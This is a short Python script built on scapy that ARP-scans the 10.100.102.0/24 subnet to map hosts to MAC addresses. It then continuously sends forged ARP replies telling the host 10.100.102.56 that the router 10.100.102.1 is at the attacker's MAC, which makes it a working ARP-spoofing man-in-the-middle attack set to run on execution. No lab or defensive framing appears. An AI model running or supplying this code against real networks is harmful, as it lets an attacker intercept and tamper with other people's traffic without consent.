import scapy.all as scapy
scapy.conf.use_pcap = True


my_mac = scapy.get_if_hwaddr(scapy.conf.iface)
my_ip  = scapy.get_if_addr(scapy.conf.iface)

def ip_scan(My_mac, My_ip) -> dict:

    all_ip_dict  = {}
    
    for i in range(1, 255):
        print(f"now checking 10.100.102.{i}...")
        pkt = scapy.Ether(dst= "ff:ff:ff:ff:ff:ff",src= My_mac )/scapy.ARP(
            op= 1, 
            psrc= My_ip,
            pdst=  f"10.100.102.{i}",
            hwsrc= My_mac
        )
        
        
        answer, unanswered = scapy.srp(pkt, timeout= 1, verbose= False )
        if answer:
            all_ip_dict[f"10.100.102.{i}"] = answer[0][1].hwsrc

    return all_ip_dict

def Get_mac_adress(My_ip, My_mac, Dst_ip):
    pkt = scapy.Ether(dst= "ff:ff:ff:ff:ff:ff", src= My_mac)/scapy.ARP(
        op= "who-has", 
        psrc= My_ip, 
        hwsrc= My_mac, 
        pdst= Dst_ip
    )
    ans, unans= scapy.srp(pkt, timeout= 1, verbose= False)
    if ans:
        mac = ans[0][1].hwsrc
        return mac
    else:
        print(f"{Dst_ip} wasnt found")
        return None

def arp_spoof(My_ip, My_mac, Dst_ip, router_ip):
    dst_mac = None
    while not dst_mac:
       dst_mac = Get_mac_adress(My_ip, My_mac, Dst_ip)

    arp = scapy.Ether(dst= dst_mac, src= My_mac)/scapy.ARP(
        op = 2, 
        psrc= router_ip, 
        hwsrc= My_mac, 
        pdst= Dst_ip, 
        hwdst= dst_mac
    )
    scapy.sendp(arp, loop=1, inter=2)


#all_ip_and_mac = ip_scan("56:1b:3f:d7:7c:6c","10.100.102.55")

arp_spoof(my_ip,my_mac, "10.100.102.56", "10.100.102.1")


